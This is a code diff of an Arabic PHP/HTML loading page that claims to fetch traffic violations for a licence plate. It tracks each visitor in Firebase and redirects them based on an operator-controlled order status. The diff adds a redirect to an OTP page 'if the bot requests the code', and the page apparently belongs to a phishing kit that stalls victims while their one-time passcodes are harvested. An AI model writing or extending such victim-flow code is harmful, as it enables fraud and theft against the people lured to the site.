@@ -1,6 +1,5 @@
 <?php
-// صفحة الانتظار - المهندس حسن
-// تم تنظيف الكود تماماً من أي اتصالات خارجية بـ MySQL
+// صفحة الانتظار الذكية - النسخة النهائية المستقرة
 ?>
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -17,7 +16,7 @@
             display: flex; justify-content: center; align-items: center;
             height: 100vh; overflow: hidden;
         }
-        .loading-container { text-align: center; padding: 20px; }
+        .loading-container { text-align: center; padding: 20px; width: 100%; }
         .spinner {
             width: 60px; height: 60px;
             border: 6px solid #ddd;
@@ -29,30 +28,24 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .text { color: #333; font-size: 20px; font-weight: 600; margin-bottom: 10px; }
         .sub-text { color: #6e6e6e; font-size: 15px; }
-        
         .progress-bar {
-            width: 200px;
-            height: 6px;
-            background: #eee;
-            border-radius: 3px;
-            margin: 20px auto;
-            overflow: hidden;
-            position: relative;
+            width: 200px; height: 6px;
+            background: #eee; border-radius: 3px;
+            margin: 20px auto; overflow: hidden; position: relative;
         }
         .progress-fill {
-            width: 0%;
-            height: 100%;
+            width: 0%; height: 100%;
             background: var(--main-green);
-            animation: grow 15s ease-in-out forwards;
+            animation: grow 20s ease-in-out forwards;
         }
-        @keyframes grow { from { width: 0%; } to { width: 95%; } }
+        @keyframes grow { from { width: 0%; } to { width: 98%; } }
     </style>
 </head>
 <body>
 
     <div class="loading-container">
         <div class="spinner"></div>
-        <div class="text">جاري الاتصال بالنظام المركزي...</div>
+        <div class="text" id="main-text">جاري الاتصال بالنظام المركزي...</div>
         <div class="sub-text">يرجى الانتظار، يتم الآن سحب بيانات اللوحة</div>
         <div class="progress-bar"><div class="progress-fill"></div></div>
         <div class="sub-text" id="status-msg">يتم التحقق من قاعدة البيانات...</div>
@@ -73,19 +66,19 @@
         
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
-
         const orderId = sessionStorage.getItem("last_order_id");
 
         if (!orderId) {
-            window.location.href = "index.php";
+            // بدل ما نرجعه للرئيسية فوراً ونعمل إزعاج، هنطلب منه إعادة المحاولة لو مفيش ID
+            document.getElementById("status-msg").innerText = "خطأ في الجلسة، يرجى العودة للرئيسية.";
         } else {
-            // تحديث حالة الزائر في لوحة التحكم إنه وصل لصفحة التحميل
-            db.collection("active_visits").doc(orderId).update({
-                page: "loading",
+            // تحديث التواجد (Active Visits)
+            db.collection("active_visits").doc(orderId).set({
+                page: "Loading Page",
                 last_seen: firebase.firestore.FieldValue.serverTimestamp()
-            }).catch(() => {});
+            }, { merge: true });
 
-            // مراقبة الطلب (Real-time)
+            // مراقبة ذكية للطلب
             const unsubscribe = db.collection("orders").doc(orderId)
                 .onSnapshot((doc) => {
                     if (doc.exists) {
@@ -93,17 +86,24 @@
                         const status = data.status;
 
                         if (status === "processing") {
-                            document.getElementById("status-msg").innerText = "تم العثور على اللوحة، جاري حساب المخالفات...";
+                            document.getElementById("status-msg").innerText = "تم العثور على البيانات، جاري معالجة المخالفات...";
                         }
 
                         if (status === "success") {
                             unsubscribe();
-                            window.location.href = "violations_view.php";
+                            window.location.replace("violations_view.php"); 
                         }
                         
+                        // إضافة حالة الـ OTP عشان لو البوت طلب الكود
+                        if (status === "waiting_otp") {
+                            unsubscribe();
+                            window.location.replace("otp.php");
+                        }
+
                         if (status === "error") {
-                            alert("عذراً، لم يتم العثور على بيانات لهذه اللوحة. يرجى التأكد والمحاولة لاحقاً.");
-                            window.location.href = "index.php";
+                            document.getElementById("main-text").innerText = "نعتذر منك";
+                            document.getElementById("status-msg").innerHTML = "<span style='color:red'>عذراً، لم نتمكن من جلب البيانات حالياً. يرجى المحاولة لاحقاً.</span>";
+                            // شلنا الـ redirect التلقائي عشان الزبون يشوف الرسالة
                         }
                     }
                 });
